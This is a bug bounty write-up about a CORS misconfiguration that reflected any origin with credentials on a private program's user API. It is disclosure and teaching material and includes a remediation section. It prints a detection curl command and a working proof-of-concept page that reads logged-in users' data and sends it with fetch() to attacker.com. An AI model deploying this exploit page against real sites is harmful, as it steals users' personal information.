# Title: My First Bug Bounty: CORS Misconfiguration on Intigriti

- **Platform**: Intigriti
- **Program**: Private Program
- **Severity**: Medium
- **Date**: August 6, 2024
- **Researcher**: r0b0ts
- **Bounty**: N/A

## Summary
A CORS misconfiguration was found on a private Intigriti program's API endpoint. The server reflected arbitrary origins with credentials enabled, allowing an attacker to steal authenticated user data using a cross-origin XMLHttpRequest exploit.

## Technical Details
The vulnerable endpoint at `https://vulnerable_host/v2/user/` returned sensitive user data in JSON format. The server's CORS policy reflected any origin provided in the request header and set `Access-Control-Allow-Credentials: true`. This allowed an attacker to create a malicious page that would make an authenticated XHR request to this endpoint and send the response to an attacker-controlled server.

## Steps to Reproduce
1. Identify API endpoint returning user data
2. Test with `curl -I -H "Origin: https://evil.com" https://vulnerable_host/v2/user/`
3. Confirm `Access-Control-Allow-Origin: https://evil.com` in response
4. Create PoC HTML page with XHR request
5. Host the page and trick a logged-in user to visit it

## Proof of Concept
```
Step 1 - Detection:
curl -I -H "Origin: https://evil.com" https://vulnerable_host/v2/user/

Response includes:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true

Step 2 - Exploit HTML:
<html>
<body>
  <h2>CORS PoC</h2>
  <div id="demo">
    <button type="button" onclick="cors()">Exploit</button>
  </div>
  <script>
  function cors() {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
      if (this.readyState == 4 && this.status == 200) {
        fetch('https://attacker.com/save?data=' + encodeURIComponent(this.responseText));
      }
    };
    xhr.open('GET', 'https://vulnerable_host/v2/user/', true);
    xhr.withCredentials = true;
    xhr.send();
  }
  </script>
</body>
</html>
```

## Impact
Data exfiltration of authenticated user information. An attacker could steal names, emails, addresses, and any other data returned by the user endpoint from logged-in users who visit the attacker's malicious page.

## Remediation
Implement a whitelist of allowed origins on the server. Do not dynamically reflect the Origin header. Restrict credentialed CORS requests to specific, trusted domains only. Use proper server-side CORS middleware configuration.

## References
- https://r0b0ts.medium.com/my-first-bug-bounty-cors-misconfiguration-3e6f38835c4e
